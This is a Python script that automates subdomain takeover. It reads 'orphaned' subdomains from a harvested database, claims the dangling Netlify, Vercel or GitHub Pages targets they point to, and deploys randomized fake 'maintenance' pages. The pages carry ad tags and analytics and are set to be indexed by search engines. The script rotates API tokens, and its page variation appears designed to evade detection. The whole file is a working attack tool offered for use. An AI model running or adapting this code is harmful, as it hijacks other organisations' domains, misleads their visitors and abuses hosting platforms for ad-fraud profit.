import sqlite3
import os
import requests
import zipfile
import io
import base64
import time
import random

# Split the comma-separated strings into lists for rotation
NETLIFY_TOKENS = os.environ.get('NETLIFY_TOKEN', '').split(',')
VERCEL_TOKENS = os.environ.get('VERCEL_TOKEN', '').split(',')
GH_TOKEN = os.environ.get('GH_ORG_TOKEN')
GA4_ID = os.environ.get('GA4_ID')
DB_NAME = 'harvested.db'

# --- POLYMORPHIC HTML GENERATOR ---
def generate_polymorphic_html(subdomain):
    # Randomized CSS styles
    bg_colors = ['#0d1117', '#1a1a2e', '#f4f4f9', '#222222', '#0f172a']
    text_colors = ['#58a6ff', '#e94560', '#00d2d3', '#fbbf24', '#8b949e']
    fonts = ['Arial, sans-serif', 'Helvetica, sans-serif', 'Segoe UI, sans-serif', 'Roboto, sans-serif']
    
    # Randomized Copy
    titles = ["We'll be right back.", "Maintenance in Progress", "Under Construction", "We are upgrading.", "Be right back."]
    messages = [
        "Our platform is undergoing scheduled upgrades to improve performance.",
        "We're doing some quick maintenance. Thank you for your patience.",
        "Our systems are being updated. Check back soon.",
        "We'll be back online shortly. Thanks for visiting!"
    ]
    
    # Randomized Ad Tags (Replace these with your real ad tags later)
    ad_tags = [
        '',
        '<script src="https://propellerads.com/fake-tag-1.js"></script>',
        '<script src="https://adsterra.com/fake-tag-2.js"></script>'
    ]

    bg = random.choice(bg_colors)
    txt = random.choice(text_colors)
    font = random.choice(fonts)
    title = random.choice(titles)
    msg = random.choice(messages)
    ad = random.choice(ad_tags)

    # Build the HTML
    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="index, follow">
    <meta name="description" content="{msg}">
    <title>{title}</title>
    <style>
        body {{ font-family: {font}; background: {bg}; color: {txt}; text-align: center; padding-top: 15%; }}
        .container {{ max-width: 600px; margin: 0 auto; padding: 20px; }}
        h1 {{ font-size: 36px; margin-bottom: 20px; }}
        p {{ font-size: 16px; opacity: 0.8; line-height: 1.5; }}
        .spinner {{ border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid {txt}; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 30px auto; }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
    </style>
</head>
<body>
    <div class="container">
        <h1>{title}</h1>
        <p>{msg}</p>
        <div class="spinner"></div>
        <p id="countdown" style="font-weight: bold;">Est. Time Remaining: 0{random.randint(3, 9)}:00</p>
    </div>
    {ad}
</body>
</html>"""
    # Inject Analytics if the ID is present
    analytics_script = ""
    if GA4_ID:
        analytics_script = f"""<!-- Google Analytics 4 -->
<script async src="https://www.googletagmanager.com/gtag/js?id={GA4_ID}"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){{dataLayer.push(arguments);}}
  gtag('js', new Date());
  gtag('config', '{GA4_ID}', {{
    'page_title': '{title}',
    'page_location': f'https://{subdomain}' 
  }});
</script>"""
        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="index, follow">
    <meta name="description" content="{msg}">
    <title>{title}</title>
    {analytics_script}
    <style>
        body {{ font-family: {font}; background: {bg}; color: {txt}; text-align: center; padding-top: 15%; }}
        .container {{ max-width: 600px; margin: 0 auto; padding: 20px; }}
        h1 {{ font-size: 36px; margin-bottom: 20px; }}
        p {{ font-size: 16px; opacity: 0.8; line-height: 1.5; }}
        .spinner {{ border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid {txt}; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 30px auto; }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
    </style>
</head>
<body>
    <div class="container">
        <h1>{title}</h1>
        <p>{msg}</p>
        <div class="spinner"></div>
        <p id="countdown" style="font-weight: bold;">Est. Time Remaining: 0{random.randint(3, 9)}:00</p>
    </div>
    {ad}
</body>
</html>"""
    return html
# --- NETLIFY DEPLOYMENT ---
def deploy_to_netlify(subdomain, cname_target):
    if '.netlify.app' not in cname_target:
        return False
    
    # Randomly select a token from our list
    if not NETLIFY_TOKENS or NETLIFY_TOKENS == ['']:
        print("[-] No Netlify tokens found.")
        return False
    token = random.choice(NETLIFY_TOKENS)
        
    base_name = cname_target.split('.netlify.app')[0]
    site_name = base_name.replace('.', '-')
    
    headers = {'Authorization': f'Bearer {token}'}

    print(f"[*] Creating Netlify site: {site_name} (Using token ending in ...{token[-4:]})")
    site_url = "https://api.netlify.com/api/v1/sites"
    site_payload = {'name': site_name}
    
    try:
        res = requests.post(site_url, headers=headers, json=site_payload)
        if res.status_code != 200 and res.status_code != 201:
            return False
            
        site_data = res.json()
        site_id = site_data['id']
        print(f"[+] Site created. ID: {site_id}")

        print("[*] Building deployment payload...")
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED, False) as zip_file:
            file_content = generate_polymorphic_html(subdomain)
            zip_file.writestr('index.html', file_content)
        zip_buffer.seek(0)

        print("[*] Deploying payload...")
        deploy_url = f"https://api.netlify.com/api/v1/sites/{site_id}/deploys"
        deploy_headers = {
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/zip'
        }
        
        deploy_res = requests.post(deploy_url, headers=deploy_headers, data=zip_buffer.read())
        
        if deploy_res.status_code in [200, 201]:
            print(f"🔥 DEPLOY SUCCESS (Netlify): {subdomain}")
            return True
        return False

    except Exception as e:
        print(f"[-] Error deploying {subdomain}: {e}")
        return False

# --- VERCEL DEPLOYMENT ---
def deploy_to_vercel(subdomain, cname_target):
    if '.vercel.app' not in cname_target:
        return False

    # Randomly select a token from our list
    if not VERCEL_TOKENS or VERCEL_TOKENS == ['']:
        print("[-] No Vercel tokens found.")
        return False
    token = random.choice(VERCEL_TOKENS)

    base_name = cname_target.split('.vercel.app')[0]
    project_name = base_name.replace('.', '-')

    headers = {
        'Authorization': f'Bearer {token}',
        'Content-Type': 'application/json'
    }

    print(f"[*] Creating Vercel project: {project_name} (Using token ending in ...{token[-4:]})")
    project_url = "https://api.vercel.com/v10/projects"
    project_payload = {'name': project_name}
    
    try:
        res = requests.post(project_url, headers=headers, json=project_payload)
        if res.status_code not in [200, 201]:
            return False
            
        project_data = res.json()
        project_id = project_data['id']

        print("[*] Building deployment payload...")
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED, False) as zip_file:
            file_content = generate_polymorphic_html(subdomain)
            zip_file.writestr('index.html', file_content)
        zip_buffer.seek(0)

        print("[*] Deploying payload to Vercel...")
        deploy_url = "https://api.vercel.com/v13/deployments"
        deploy_headers = {
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/zip'
        }
        params = {'name': project_name, 'target': 'production'}
        
        deploy_res = requests.post(deploy_url, headers=deploy_headers, params=params, data=zip_buffer.read())
        
        if deploy_res.status_code in [200, 201]:
            print(f"🔥 DEPLOY SUCCESS (Vercel): {subdomain}")
            return True
        return False

    except Exception as e:
        print(f"[-] Vercel Error deploying {subdomain}: {e}")
        return False

# --- GITHUB PAGES DEPLOYMENT ---
def deploy_to_github(subdomain, cname_target):
    if '.github.io' not in cname_target:
        return False
        
    target_org = cname_target.split('.github.io')[0]
    repo_name = f"{target_org}.github.io"
    
    headers = {
        'Authorization': f'token {GH_TOKEN}',
        'Accept': 'application/vnd.github+json'
    }

    print(f"[*] Creating GitHub Org: {target_org}")
    org_url = "https://api.github.com/orgs"
    org_payload = {'login': target_org}
    
    try:
        org_res = requests.post(org_url, headers=headers, json=org_payload)
        if org_res.status_code not in [201, 422]:
            print(f"[-] Failed to create Org {target_org}: {org_res.text}")
            return False

        print(f"[+] Org ready: {target_org}")
        
        print(f"[*] Creating GitHub Repo: {repo_name} under {target_org}")
        repo_url = f"https://api.github.com/orgs/{target_org}/repos"
        repo_payload = {'name': repo_name, 'visibility': 'public'}
        
        repo_res = requests.post(repo_url, headers=headers, json=repo_payload)
        if repo_res.status_code not in [201, 422]:
            print(f"[-] Failed to create Repo: {repo_res.text}")
            return False

        print("[*] Uploading polymorphic index.html via Contents API...")
        html_content = generate_polymorphic_html(subdomain)
        content_base64 = base64.b64encode(html_content.encode('utf-8')).decode('utf-8')
            
        file_url = f"https://api.github.com/repos/{target_org}/{repo_name}/contents/index.html"
        file_payload = {
            'message': 'Initial deploy',
            'content': content_base64
        }
        
        file_res = requests.put(file_url, headers=headers, json=file_payload)
        if file_res.status_code not in [200, 201]:
            print(f"[-] Failed to upload HTML: {file_res.text}")
            return False

        print("[*] Uploading CNAME file...")
        cname_content = base64.b64encode(subdomain.encode('utf-8')).decode('utf-8')
        cname_url = f"https://api.github.com/repos/{target_org}/{repo_name}/contents/CNAME"
        cname_payload = {
            'message': 'Add CNAME',
            'content': cname_content
        }
        
        cname_res = requests.put(cname_url, headers=headers, json=cname_payload)
        if cname_res.status_code not in [200, 201]:
            print(f"[-] Failed to upload CNAME: {cname_res.text}")
            return False

        print(f"🔥 DEPLOY SUCCESS (GitHub Pages): {subdomain}")
        return True

    except Exception as e:
        print(f"[-] GitHub Error deploying {subdomain}: {e}")
        return False

# --- MAIN ROUTER ---
def main():
    if not NETLIFY_TOKENS and not VERCEL_TOKENS and not GH_TOKEN:
        print("[-] No API tokens found.")
        return

    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    
    c.execute("SELECT subdomain, cname_target FROM subdomains WHERE status='orphaned'")
    targets = c.fetchall()
    
    if not targets:
        print("[*] No orphaned domains to deploy yet.")
        return

    for target in targets:
        subdomain = target[0]
        cname_target = target[1]
        
        if '.netlify.app' in cname_target and NETLIFY_TOKENS:
            success = deploy_to_netlify(subdomain, cname_target)
        elif '.vercel.app' in cname_target and VERCEL_TOKENS:
            success = deploy_to_vercel(subdomain, cname_target)
        elif '.github.io' in cname_target and GH_TOKEN:
            success = deploy_to_github(subdomain, cname_target)
        else:
            c.execute("UPDATE subdomains SET status='deploy_skipped' WHERE subdomain=?", (subdomain,))
            conn.commit()
            continue
        
        if success:
            c.execute("UPDATE subdomains SET status='deployed' WHERE subdomain=?", (subdomain,))
        else:
            c.execute("UPDATE subdomains SET status='deploy_failed' WHERE subdomain=?", (subdomain,))
            
        conn.commit()
        time.sleep(2) # Rate limiting safety

    conn.close()
    print("[*] Deployment run complete.")

if __name__ == "__main__":
    main()

